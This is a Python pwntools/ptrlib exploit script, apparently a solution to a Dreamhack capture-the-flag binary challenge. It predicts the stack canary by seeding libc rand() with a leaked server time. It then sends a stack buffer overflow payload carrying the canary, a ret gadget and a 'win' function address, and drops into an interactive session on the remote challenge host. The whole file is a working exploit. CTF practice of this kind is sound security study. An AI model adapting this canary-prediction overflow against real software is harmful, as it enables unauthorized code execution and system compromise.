#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import ctypes

exe = ptr.ELF("./prob")
cdll = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 22580)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def mask64(value: int) -> int:
    masked = value & 0xFFFFFFFFFFFFFFFF
    return masked


def mask8(value: int) -> int:
    masked = value & 0xFF
    return masked


def reprod_canary(time: int) -> int:
    cdll.srand(time)
    canary = 0
    for i in range(8):
        r = mask8(cdll.rand())
        canary = mask64(r | canary << 8)
        continue

    return canary


def main():
    io = connect()

    win_func = unwrap(exe.symbol("win"))
    ret_in_exe = next(exe.gadget("ret;"))

    canary = 0
    io.recvuntil("time: ")
    current_time = int(io.recvline().strip(b"\n"))
    canary = reprod_canary(current_time)
    ptr.logger.info(f"canary: {hex(canary)}")

    payload = b""
    payload += b"A" * 0x10
    payload += ptr.p64(canary)
    payload = payload.ljust(0x28, b"A")
    payload += ptr.p64(ret_in_exe)
    payload += ptr.p64(win_func)
    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
